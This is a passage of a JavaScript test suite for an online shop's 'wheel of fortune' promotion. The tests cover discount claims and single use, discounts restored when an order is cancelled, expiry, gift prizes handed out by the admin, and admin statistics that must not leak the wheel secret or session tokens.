  assert.equal(env.post({ action: 'wheel_spin', token: first.token }).ok, true);
});

test('wheel: -20 % discount — applied to the items at checkout, once; old promo codes are refused', () => {
  const env = env0();
  const a = wheelUser(env, '0612000031');
  const c = env.post({ action: 'wheel_claim', session: a.session, token: mint(env, 8) });
  assert.equal(c.wheel.kind, 'remise');
  assert.equal(c.wheel.state, 'active');
  assert.equal(c.wheel.value, 20);
  const until = c.wheel.untilTs;
  assert.ok(Math.abs(until - (Date.now() + 30 * 864e5)) < 60000);
  assert.equal(meOf(env, a.session).wheel.state, 'active');
  // guests, other accounts: refused
  assert.equal(env.post(order({ wheel: true })).error, 'auth');
  const b = wheelUser(env, '0612000032');
  assert.equal(env.post(order({ wheel: true, session: b.session })).error, 'bad_wheel');
  assert.equal(rowsOf(env, 'Commandes').length, 1);
  // 1 690 DH: -338 DH, delivery free
  const o = env.post(order({ wheel: true, session: a.session, promoCode: 'KOBG26', total: 1352 }));
  assert.equal(o.ok, true, JSON.stringify(o));
  assert.equal(o.discountPct, 20);
  assert.equal(o.discount, 338);
  assert.equal(o.promoCode, 'ROUE');
  assert.equal(o.delivery, 0);
  assert.equal(o.total, 1352);
  assert.equal(o.wheel, 20);
  assert.equal(o.adjusted, true);                                              // the promo code was dropped (noted)
  const row = rowsOf(env, 'Commandes')[1];
  assert.equal(row[10], 'ROUE');
  assert.equal(row[11], 20);
  assert.equal(row[13], 1352);
  assert.match(rowsOf(env, 'Gestion')[1][2], /Code promo refusé : KOBG26/);
  assert.match(rowsOf(env, 'Gestion')[1][2], /Roue de la chance » -20 %/);
  const R = rowsOf(env, 'Roue')[1];
  assert.equal(R[11], 'Utilisée');
  assert.equal(R[12], o.orderId);
  assert.equal(meOf(env, a.session).wheel.state, 'used');
  // single use
  assert.equal(env.post(order({ wheel: true, session: a.session })).error, 'bad_wheel');
  // promo codes were removed: the old one gives nothing
  assert.equal(env.post(order({ session: a.session, promoCode: 'KOBG26' })).discountPct, 0);
});

test('wheel: a cancelled order gives the discount back; re-activating takes it again; expiry is enforced', () => {
  const env = env0();
  const a = wheelUser(env, '0612000041');
  env.post({ action: 'wheel_claim', session: a.session, token: mint(env, 4) });     // -50 %
  const o = env.post(order({ wheel: true, session: a.session, items: [{ id: BODY, qty: 1, unitPrice: 4190 }] }));
  assert.equal(o.discount, 2095);                                                    // round(4190 / 2)
  assert.equal(o.delivery, 0);
  assert.equal(o.total, 2095);
  const tok = env.post({ action: 'auth', key: KEY }).token;
  const u = env.post({ action: 'update', key: tok, id: o.orderId, status: 'Annulée' });
  assert.equal(u.ok, true);
  assert.ok(u.order.hist.some((h) => /remise -50 % rendue/.test(h.note || '')));
  assert.equal(meOf(env, a.session).wheel.state, 'active');
  env.post({ action: 'update', key: tok, id: o.orderId, status: 'Confirmée' });
  assert.equal(meOf(env, a.session).wheel.state, 'used');
  env.post({ action: 'update', key: tok, id: o.orderId, status: 'Retournée' });
  assert.equal(meOf(env, a.session).wheel.state, 'active');
  // expired: refused at checkout, shown as expired
  rowsOf(env, 'Roue')[1][10] = new Date(Date.now() - 1000);
  assert.equal(meOf(env, a.session).wheel.state, 'expired');
  assert.equal(env.post(order({ wheel: true, session: a.session })).error, 'bad_wheel');
});

test('wheel: gift prizes wait in the customer file, flagged on their orders, marked « remis » by the admin', () => {
  const env = env0();
  const a = wheelUser(env, '0612000051');
  const c = env.post({ action: 'wheel_claim', session: a.session, token: mint(env, 1) });
  assert.equal(c.wheel.kind, 'cadeau');
  assert.equal(c.wheel.state, 'pending');
  assert.equal(c.balance, undefined);
  assert.ok(!env.sheets.Points || rowsOf(env, 'Points').length === 1);              // no points for a gift
  const o = env.post(order({ session: a.session }));
  assert.match(rowsOf(env, 'Gestion')[1][2], /Cadeau « Roue de la chance » à remettre à ce client : Gants de sac Rival RB10 Intelli-Shock Noir\/Rouge/);
  const tok = env.post({ action: 'auth', key: KEY }).token;
  const list = env.post({ action: 'list', key: tok });
  assert.equal(list.clients[a.profile.id].wheel.state, 'pending');
  const d = env.post({ action: 'client', key: tok, client: a.profile.id });
  assert.equal(d.client.wheel.label, 'Gants de sac Rival RB10 Intelli-Shock Noir/Rouge');
  const spin = d.client.wheel.spin;
  assert.equal(env.post({ action: 'wheel_gift', spin: spin }).error, 'bad_key');
  assert.equal(env.post({ action: 'wheel_gift', key: tok, spin: 'nope' }).error, 'not_found');
  const g = env.post({ action: 'wheel_gift', key: tok, spin: spin, given: true });
  assert.equal(g.ok, true);
  assert.equal(g.wheel.state, 'given');
  assert.equal(rowsOf(env, 'Roue')[1][11], 'Remis');
  assert.equal(meOf(env, a.session).wheel.state, 'given');
  assert.equal(env.post({ action: 'wheel_gift', key: tok, spin: spin, given: false }).wheel.state, 'pending');
  assert.ok(o.ok);
});

test('wheel: admin stats — spins and claims per prize with the configured odds; no secrets', () => {
  const env = env0();
  for (let i = 0; i < 5; i++) env.post({ action: 'wheel_spin' });
  const a = wheelUser(env, '0612000061');
  env.post({ action: 'wheel_claim', session: a.session, token: mint(env, 8) });
  const tok = env.post({ action: 'auth', key: KEY }).token;
  assert.equal(env.post({ action: 'wheel' }).error, 'bad_key');
  assert.equal(env.post({ action: 'wheel', session: a.session }).error, 'bad_key');
  const s = env.post({ action: 'wheel', key: tok });
  assert.equal(s.ok, true);
  assert.equal(s.spins, 5);
  assert.equal(s.claims, 1);
  assert.equal(s.valid, true);
  assert.equal(s.prizes.length, 8);
  const by = Object.fromEntries(s.prizes.map((p) => [p.key, p]));
  assert.equal(by.pts10.odds, 48.315);
  assert.equal(by.pts10.slices, 2);
  assert.equal(by.gant.odds, 0.01);
  assert.equal(by.pct20.claims, 1);
  assert.equal(by.pct20.open, 1);
  assert.equal(s.prizes.reduce((n, p) => n + p.spins, 0), 5);
  assert.equal(s.recent[0].email, a.profile.email);
  const txt = JSON.stringify(s) + JSON.stringify(env.post({ action: 'client', key: tok, client: a.profile.id }));
  assert.ok(!txt.includes(env.props.get('WHEEL_SECRET')));
  assert.ok(!/"(sel|hash|iter|session|token)"/.test(txt));
});

test('setup() creates the Roue tab and the wheel secret', () => {
  const env = env0();
  env.run('setup');
  assert.deepEqual(rowsOf(env, 'Roue')[0].slice(0, 4), ['Réclamé le', 'ID tirage', 'Tiré le', 'Lot']);
  const sec = env.props.get('WHEEL_SECRET');
  assert.ok(sec.length >= 64);
  env.run('setup');
  assert.equal(env.props.get('WHEEL_SECRET'), sec);                                // kept: old tokens stay valid
  assert.ok(env.logs.some((l) => /probabilités OK/.test(l)));
});
